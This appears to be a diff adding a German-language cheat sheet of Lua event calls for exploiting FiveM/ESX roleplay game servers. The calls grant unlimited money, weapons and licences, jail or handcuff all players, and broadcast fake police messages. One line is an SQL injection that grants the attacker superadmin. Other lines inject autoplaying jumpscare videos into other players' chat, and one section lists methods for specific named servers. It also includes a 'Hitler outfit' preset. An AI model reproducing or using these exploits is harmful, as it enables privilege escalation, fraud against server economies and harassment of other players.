@@ -1,1 +1,576 @@
+Money:
+-TriggerServerEvent('esx_dmvschool:pay', 999999999999999999)
+-TriggerServerEvent('lester:vendita')
+-TriggerServerEvent('bvrtck_fuel:zahlen',999999999999999999999999999999999)
+-TriggerServerEvent('fuel:pay', 999999999999999999999999)
+-TriggerServerEvent("GoFast:VenteDuVehicule", 100000)
+-TriggerServerEvent("bankrobberies:receiveCash")
+-TriggerServerEvent('esx_truckerjob:pay', 2400000)
+-TriggerServerEvent('vrp_slotmachine:server:2', 100000)
+-TriggerServerEvent("esx_pizza:pay", 1000000)
+-TriggerServerEvent('esx_jobs:caution', 'give_back', 1000000)
+-TriggerServerEvent('lscustoms:payGarage', 1000000)
+-TriggerServerEvent("esx-qalle-jail:prisonWorkReward")
+-TriggerServerEvent('esx_tankerjob:pay', 1000000)
+-TriggerServerEvent('esx_vehicletrunk:giveDirty', 100000)
+-TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', 100000)
+-TriggerServerEvent('gambling:spend', 100000)
+-TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', 100000)
+-TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
+-TriggerServerEvent('AdminMenu:giveBank', 1000000)
+-TriggerServerEvent('AdminMenu:giveCash', 1000000)
+-TriggerServerEvent('esx_slotmachine:sv:2', 1000000)
+-TriggerServerEvent('paycheck:salary', 20000)
+-TriggerServerEvent('esx_weashop:buyItem', "WEAPON_MACHETE", -500000, "BlackWeashop")
+-TriggerServerEvent('esx_moneywash:deposit', 1000000)
+-TriggerServerEvent('esx_moneywash:withdraw', 1000000)
+-TriggerServerEvent('esx_barbershop:pay')
+-TriggerServerEvent('route68_blackjack:givemoney', count, 2)
+-TriggerServerEvent("bankrobberies:receiveCash")
+----------------------------------------------------------------------------------------
+Führerschein (Praxis & Theorie) & Waffenlizent:
+-TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
+-TriggerServerEvent('esx_dmvschool:addLicense', 'dmv ')
+-TriggerServerEvent('esx_weashop:buyLicense', 0)
+--------------------------------------------------------------------------------------
+Revive/ReviveID:
+-TriggerEvent('esx_ambulancejob:revive')
+-TriggerEvent("esx_ambulancejob:reSelinYannikTSonnysVatervive")
+-TriggerServerEvent('esx_ambulancejob:revive', 12)
+--------------------------------------------------------------------------------------
+Drogen:
+-Harvesting:
+TriggerServerEvent('esx_drugs:startHarvestWeed')
+TriggerServerEvent('esx_drugs:startHarvestCoke')
+TriggerServerEvent('esx_drugs:startHarvestMeth')
+TriggerServerEvent('esx_drugs:startHarvestOpium')
+TriggerServerEvent('esx_drugs:stopHarvestWeed')
+TriggerServerEvent('esx_drugs:stopHarvestCoke')
+TriggerServerEvent('esx_drugs:stopHarvestMeth')
+TriggerServerEvent('esx_drugs:stopHarvestOpium')
 
+ -Processing:
+TriggerServerEvent('esx_drugs:startTransformWeed')
+TriggerServerEvent('esx_drugs:startTransformCoke')
+TriggerServerEvent('esx_drugs:startTransformMeth')
+TriggerServerEvent('esx_drugs:startTransformOpium')
+TriggerServerEvent('esx_drugs:stopTransformWeed')
+TriggerServerEvent('esx_drugs:stopTransformCoke')
+TriggerServerEvent('esx_drugs:stopTransformMeth')
+TriggerServerEvent('esx_drugs:stopTransformOpium')
+
+ -Selling:
+TriggerServerEvent('esx_drugs:startSellWeed')
+TriggerServerEvent('esx_drugs:startSellCoke')
+TriggerServerEvent('esx_drugs:startSellMeth')
+TriggerServerEvent('esx_drugs:startSellOpium')
+TriggerServerEvent('esx_drugs:stopSellWeed')
+TriggerServerEvent('esx_drugs:stopSellCoke')
+TriggerServerEvent('esx_drugs:stopSellMeth')
+TriggerServerEvent('esx_drugs:stopSellOpium')
+---------------------------------------------------------------------------------------
+Alle Fesseln:
+-TriggerEvent('esx_policejob:handcuff', -1)
+-TriggerEvent('esx_lcnjob:handcuff', -1)
+---------------------------------------------------------------------------------------
+Alle Einknasten:
+Citizen.CreateThread(function()
+  for i=0, 500 do
+    Citizen.Wait(1)
+    TriggerServerEvent("esx-qalle-jail:jailPlayer", -1, 8888, 
+    Citizen.Wait(1)
+    TriggerServerEvent("esx-qalle-jail:jailPlayer", -1, 8888, 
+    Citizen.Wait(1)
+    TriggerServerEvent("esx-qalle-jail:jailPlayer", -1, 8888, 
+  end
+end)
+---------------------------------------------------------------------------------------
+Geldmethode auf Servern, wo man aktiv spielt:
+1. Eulen - Enter Solo Session
+2.Bankraub, Juwelier, Shoprob, Yacht alles starten
+---------------------------------------------------------------------------------------
+Fahrzeuge spawnen/verkaufen:
+-TriggerEvent('esx:spawnVehicle', "vehiclename")
+-TriggerServerEvent("GoFast:VenteDuVehicule", 100000)
+---------------------------------------------------------------------------------------
+Jail:
+-TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 2000000000)
+---------------------------------------------------------------------------------------
+Polizei Message:
+-TriggerServerEvent('esx_policejob:message', -1, "RDM & VDM ist jetzt erlaubt...")
+-TriggerServerEvent('enp-admin:announce',-1, "You Got Fucked")
+-TriggerServerEvent('sp_police:message',  -1, "naa")
+-TriggerEvent('messagerundruf:show',"fly team", "RDM & VDM ist jetzt erlaubt...")
+---------------------------------------------------------------------------------------
+Alle zu sich Tpen:
+-TriggerServerEvent ('bringplayertome', -1, GetEntityCoords(PlayerPedId()).x, GetEntityCoords(PlayerPedId()).y, GetEntityCoords(PlayerPedId()).z) 
+----------------------------------------------------------------------------------------
+Für Superadmin
+-TriggerServerEvent('kashactersS:DeleteCharacter', [['; UPDATE users SET group = "superadmin", permission_level = 10 WHERE name = "]] .. GetPlayerName(PlayerId()) .. [[" #']])
+----------------------------------------------------------------------------------------
+Open JailMenu:
+-TriggerEvent("esx-qalle-jail:openJailMenu")
+----------------------------------------------------------------------------------------
+Autos verkaufen:
+-TriggerServerEvent("GoFast:VenteDuVehicule", 100000)
+----------------------------------------------------------------------------------------
+Lester:
+-TriggerServerEvent('esx_vangelico_robbery:gioielli') 
+-TriggerServerEvent('lester:vendita')
+----------------------------------------------------------------------------------------
+Admin Nachricht:
+-TriggerServerEvent('enp-admin:announce',-1, "You Got Fucked")
+----------------------------------------------------------------------------------------
+Hunger & Durst:
+-TriggerEvent('esx_status:set', 'hunger', 1000000)
+-TriggerEvent('esx_status:set', 'thirst', 1000000)
+----------------------------------------------------------------------------------------
+Rechnungen:
+-TriggerServerEvent('esx_billing:sendBill', 131, "Purposeless", "Payday", 1000)
+----------------------------------------------------------------------------------------
+Waffen geben:
+-TriggerServerEvent('esx_policejob:giveWeapon', WEAPON_CARBINERIFLE,  1000)
+-TriggerServerEvent('esx_weashop:buyItem', "WEAPON_MACHETE", -500000, "BlackWeashop")
+----------------------------------------------------------------------------------------
+Admin Anzüge:
+----------------------------------------------------------------------------------------
+ Roter Admin anzug:
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 0,
+                    skin         = 0,
+                    hair_1       = 0,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 15,
+                    tshirt_2     = 0,
+                    torso_1      = 287,
+                    torso_2      = 2,
+                    arms         = 3,
+                    pants_1      = 114,
+                    pants_2      = 2,
+                    shoes_1      = 78,
+                    shoes_2      = 2,
+                    mask_1       = 135,
+                    mask_2       = 2,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 0,
+                    beard_2      = 0,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 0,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        })
+
+
+
+ Gelber Admin anzug:
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 0,
+                    skin         = 0,
+                    hair_1       = 0,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 15,
+                    tshirt_2     = 0,
+                    torso_1      = 287,
+                    torso_2      = 3,
+                    arms         = 3,
+                    pants_1      = 114,
+                    pants_2      = 3,
+                    shoes_1      = 78,
+                    shoes_2      = 3,
+                    mask_1       = 135,
+                    mask_2       = 3,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 0,
+                    beard_2      = 0,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 0,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        })
+
+ Weiser/Schwarzer Admin Anzug:
+-TriggerEvent('skinchanger:loadSkin', {
+                sex          = 0,
+                face         = 0,
+                skin         = 0,
+                hair_1       = 0,
+                hair_2       = 0,
+                hair_color_1 = 0,
+                hair_color_2 = 0,
+                decals_1     = 0,
+                decals_2     = 0,
+                tshirt_1     = 15,
+                tshirt_2     = 0,
+                torso_1      = 287,
+                torso_2      = 6,
+                arms         = 9,
+                pants_1      = 114,
+                pants_2      = 6,
+                shoes_1      = 78,
+                shoes_2      = 6,
+                mask_1       = 135,
+                mask_2       = 6,
+                bproof_1     = 0,
+                bproof_2     = 0,
+                bags_1         = 0,
+                bags_2         = 0,
+                beard_1      = 0,
+                beard_2      = 0,
+                beard_3      = 0,
+                beard_4      = 0,
+                chain_1      = 0,
+                chain_2      = 0,
+                glasses_1    = 0,
+                glasses_2    = 0,
+                })
+
+
+ Weisser/Gelber Admin Anzug:
+-TriggerEvent('skinchanger:loadSkin', {
+                sex          = 0,
+                face         = 0,
+                skin         = 0,
+                hair_1       = 0,
+                hair_2       = 0,
+                hair_color_1 = 0,
+                hair_color_2 = 0,
+                decals_1     = 0,
+                decals_2     = 0,
+                tshirt_1     = 15,
+                tshirt_2     = 0,
+                torso_1      = 287,
+                torso_2      = 6,
+                arms         = 9,
+                pants_1      = 114,
+                pants_2      = 6,
+                shoes_1      = 78,
+                shoes_2      = 6,
+                mask_1       = 135,
+                mask_2       = 6,
+                bproof_1     = 0,
+                bproof_2     = 0,
+                bags_1         = 0,
+                bags_2         = 0,
+                beard_1      = 0,
+                beard_2      = 0,
+                beard_3      = 0,
+                beard_4      = 0,
+                chain_1      = 0,
+                chain_2      = 0,
+                glasses_1    = 0,
+                glasses_2    = 0,
+                })
+
+
+ Blauer Admin Anzug:
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 0,
+                    skin         = 0,
+                    hair_1       = 0,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 15,
+                    tshirt_2     = 0,
+                    torso_1      = 287,
+                    torso_2      = 4,
+                    arms         = 3,
+                    pants_1      = 114,
+                    pants_2      = 4,
+                    shoes_1      = 78,
+                    shoes_2      = 4,
+                    mask_1       = 135,
+                    mask_2       = 4,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 0,
+                    beard_2      = 0,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 0,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        })
+
+
+ Grüner Admin anzug
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 0,
+                    skin         = 0,
+                    hair_1       = 0,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 15,
+                    tshirt_2     = 0,
+                    torso_1      = 287,
+                    torso_2      = 5,
+                    arms         = 3,
+                    pants_1      = 114,
+                    pants_2      = 5,
+                    shoes_1      = 78,
+                    shoes_2      = 5,
+                    mask_1       = 135,
+                    mask_2       = 5,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 0,
+                    beard_2      = 0,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 0,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        })
+
+---------------------------------------------------------------------------------------
+Normal Outfits: 
+----------------------------------------------------------------------------------------
+ Flyteam outfit:
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 0,
+                    skin         = 3,
+                    hair_1       = 0,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 15,
+                    tshirt_2     = 0,
+                    torso_1      = 105,
+                    torso_2      = 0,
+                    arms         = 0,
+                    pants_1      = 42,
+                    pants_2      = 2,
+                    shoes_1      = 6,
+                    shoes_2      = 0,
+                    helmet_1     = 2,
+                    helmet_2     = 3,
+                    mask_1       = 0,
+                    mask_2       = 0,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 0,
+                    beard_2      = 0,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 0,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        }) 
+
+
+ Hitler outfit:
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 13,
+                    skin         = 1,
+                    hair_1       = 18,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 10,
+                    tshirt_2     = 0,
+                    torso_1      = 72,
+                    torso_2      = 1,
+                    arms         = 33,
+                    pants_1      = 24,
+                    pants_2      = 1,
+                    shoes_1      = 38,
+                    shoes_2      = 0,
+                    mask_1       = 0,
+                    mask_2       = 0,
+                    helmet_1       = 113,
+                    helmet_2       = 0,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 9,
+                    beard_2      = 10,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 38,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        })
+
+
+ Civi outfit:
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 0,
+                    skin         = 0,
+                    hair_1       = 1,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 8,
+                    tshirt_2     = 13,
+                    torso_1      = 7,
+                    torso_2      = 2,
+                    arms         = 4,
+                    pants_1      = 24,
+                    pants_2      = 0,
+                    shoes_1      = 8,
+                    shoes_2      = 0,
+                    mask_1       = 0,
+                    mask_2       = 0,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 0,
+                    beard_2      = 0,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 0,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        })
+
+
+ Caillou outfit:
+-TriggerEvent('skinchanger:loadSkin', {
+                    sex          = 0,
+                    face         = 0,
+                    skin         = 0,
+                    hair_1       = 0,
+                    hair_2       = 0,
+                    hair_color_1 = 0,
+                    hair_color_2 = 0,
+                    decals_1     = 0,
+                    decals_2     = 0,
+                    tshirt_1     = 0,
+                    tshirt_2     = 0,
+                    torso_1      = 0,
+                    torso_2      = 0,
+                    arms         = 0,
+                    pants_1      = 0,
+                    pants_2      = 0,
+                    shoes_1      = 0,
+                    shoes_2      = 0,
+                    mask_1       = 0,
+                    mask_2       = 0,
+                    bproof_1     = 0,
+                    bproof_2     = 0,
+                    bags_1         = 0,
+                    bags_2         = 0,
+                    beard_1      = 0,
+                    beard_2      = 0,
+                    beard_3      = 0,
+                    beard_4      = 0,
+                    chain_1      = 0,
+                    chain_2      = 0,
+                    glasses_1    = 0,
+                    glasses_2    = 0,
+                        })
+
+----------------------------------------------------------------------------------------
+Jumscare:
+-TriggerServerEvent('OOC', FLIEGE, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/808125919578947615/883501971166863440/pablo-meme.mp4" </video>')
+
+-TriggerServerEvent('OOC', 27, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/898554611701547038/900658277308842004/Rick_Rolled_Short_Version.mp4" </video>')
+
+-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/897483537773649940/911368715935825920/lv_0_20211113142019.mp4" </video>')
+
+-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/839909756075638814/904101390249521152/Untitled.mov" </video>')
+
+-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/903976778199089203/904030889674166302/yt1s.com_-_Screamer_annejpg_links_in_description.mp4" </video>')
+
+-TriggerServerEvent('OOC',ID, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/898554611701547038/900658277308842004/Rick_Rolled_Short_Version.mp4" </video>')
+
+-TriggerServerEvent('OOC', FLYTEAM, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/808125919578947615/883501971166863440/pablo-meme.mp4" </video>')
+
+-TriggerServerEvent('OOC', 27, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/899631562096775199/899684849814761472/ready.mp4" </video>')
+
+-TriggerServerEvent('OOC', id, -1, '<video autoplay style="position:absolute; height: 100vh; width: 100vw;"> <source autoplay="true" src="https://cdn.discordapp.com/attachments/868650335831470130/875435473684791316/Jeff_the_Killer_Jumpscare.mp4"> </video>')
+
+|Replaced "id" zu einer vorhandenen Spielerid|
+----------------------------------------------------------------------------------------
+Server Methods:
+----------------------------------------------------------------------------------------
+FiveCity:
+-TriggerServerEvent('lester:vendita')
+----------------------------------------------------------------------------------------
+SunsideRP:
+-TriggerServerEvent("esx_yacht:reward")
+----------------------------------------------------------------------------------------
+DemonV:
+-TriggerServerEvent('lester:vendita')
+-TriggerServerEvent('esx_dmvschool:pay', 999999999999999999)
+----------------------------------------------------------------------------------------
+HighLife-RolePlay:
+-TriggerServerEvent('esx_farms:farm',"weed")
+-TriggerServerEvent('esx_farms:sell',"weed", "10000000000")
+----------------------------------------------------------------------------------------
+DLRP:
+-TriggerServerEvent('esx_ambulancejob:giveItem',"jewels")
+----------------------------------------------------------------------------------------
+Sixv:
+-TriggerServerEvent('sixv_trauben:stopHarvestKoda')
+
+ TraubenSammler2
+-TriggerServerEvent('sixv_trauben:stopHarvestKoda')
+
+ TraubenSammler3
+-TriggerServerEvent('sixv_trauben:stopHarvestKoda')
+
+ TraubenVerarbeiter
+-TriggerServerEvent('sixv_trauben:stopTransformKoda')
+
+ TraubenVerkaeufer
+-TriggerServerEvent('sixv_trauben:stopSellKoda')
+----------------------------------------------------------------------------------------
+Dinero City:
+-TriggerServerEvent("esx-qalle-jail:prisonWorkReward")
+-TriggerServerEvent("esx-qalle-jail:prisonWorkReward")
+-TriggerServerEvent("esx-qalle-jail:prisonWorkReward")
+-TriggerServerEvent("esx-qalle-jail:prisonWorkReward")
+-Repeat Execution 25
+----------------------------------------------------------------------------------------
+Made By Ente#7092
+----------------------------------------------------------------------------------------
